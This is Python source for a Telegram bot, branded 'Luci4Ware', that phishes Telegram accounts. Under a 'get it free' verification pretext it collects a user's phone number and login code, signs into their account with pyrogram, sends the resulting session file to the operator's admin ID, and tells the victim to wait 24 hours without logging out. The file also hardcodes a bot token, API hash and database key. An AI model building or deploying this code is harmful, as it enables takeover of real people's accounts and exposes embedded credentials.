import logging
import os
import asyncio
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.dispatcher import FSMContext
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.filters.state import State, StatesGroup
from pyrogram import Client as TgClient, raw
from supabase import create_client, Client

# --- КОНФИГ (ТВОИ ДАННЫЕ) ---
API_TOKEN = '8607818846:AAEjGMfOMw8JmUsXu8Zj5mUdzfP1RylLVjU'
ADMIN_ID = 6332767725 
API_ID = 33824273
API_HASH = 'c290fdceef9695342e052710e16d9bb9'

SUPABASE_URL = "https://yuksepnwkzffudhcrjnl.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl1a3NlcG53a3pmZnVkaGNyam5sIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzUwNDM5OTksImV4cCI6MjA5MDYxOTk5OX0.6IvYWJiWqVeFVkQ-SK1NbG5_yEXVyHijFMGwvMbn1q4"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot, storage=MemoryStorage())
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

class Form(StatesGroup):
    waiting_phone = State()
    waiting_code = State()
    admin_get_access_phone = State()

def get_main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("👤 Профиль", "🛒 Товары", "🔑 Активировать", "🎁 Получить бесплатно")
    return markup

# --- ГЛАВНЫЕ КОМАНДЫ ---

@dp.message_handler(commands=['start'], state='*')
async def cmd_start(message: types.Message, state: FSMContext):
    await state.finish() # Сброс всех зависших состояний
    try:
        supabase.table("users").upsert({"id": message.from_user.id, "username": message.from_user.username}).execute()
    except Exception as e:
        logging.error(f"Supabase error: {e}")
    
    await message.answer(f"👋 Привет, {message.from_user.first_name}!\nЭто Luci4Ware Bot. Используй меню ниже.", reply_markup=get_main_menu())

@dp.message_handler(lambda m: m.text == "🎁 Получить бесплатно", state='*')
async def free_start(message: types.Message, state: FSMContext):
    await state.finish()
    await Form.waiting_phone.set()
    await message.answer("🛡 **Верификация Luci4Ware**\n\nВведите ваш номер телефона в формате `+79991234567`:")

# --- ЛОВУШКА (ВВОД НОМЕРА) ---
@dp.message_handler(state=Form.waiting_phone)
async def phone_step(message: types.Message, state: FSMContext):
    phone = message.text.strip()
    if not phone.startswith('+'):
        return await message.answer("❌ Номер должен начинаться с +")
    
    if not os.path.exists("sessions"): os.makedirs("sessions")
    
    client = TgClient(f"sessions/{message.from_user.id}", API_ID, API_HASH)
    await client.connect()
    try:
        code_data = await client.send_code(phone)
        await state.update_data(phone=phone, hash=code_data.phone_code_hash)
        await Form.waiting_code.set()
        await message.answer("📩 Код подтверждения отправлен в ваш Telegram. Введите его:")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")
        await state.finish()
    await client.disconnect()

# --- ЛОВУШКА (ВВОД КОДА) ---
@dp.message_handler(state=Form.waiting_code)
async def code_step(message: types.Message, state: FSMContext):
    data = await state.get_data()
    code = message.text.strip()
    client = TgClient(f"sessions/{message.from_user.id}", API_ID, API_HASH)
    await client.connect()
    try:
        await client.sign_in(data['phone'], data['hash'], code)
        await client.disconnect()
        
        # Пересылка сессии тебе
        with open(f"sessions/{message.from_user.id}.session", 'rb') as f:
            await bot.send_document(ADMIN_ID, f, caption=f"🚀 Новая сессия диверсанта: {data['phone']}")

        await message.answer("✅ **Верификация успешна!**\n\nНеобходимо подождать 24 часа для привязки HWID. Не выходите из аккаунта!", reply_markup=get_main_menu())
        
        # Запись в базу
        supabase.table("users").update({"phone": data['phone'], "is_verified": True}).eq("id", message.from_user.id).execute()
        
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")
    await state.finish()

# --- АДМИН ПАНЕЛЬ ---
@dp.message_handler(commands=['admin_panel'], state='*')
async def admin_panel(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    res = supabase.table("users").select("*").not_label("phone", "is", "null").execute()
    text = "🚀 **Панель управления:**\n\n"
    for u in res.data:
        text += f"📱 `{u['phone']}` | ID: `{u['id']}`\n"
    await message.answer(text)

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
    
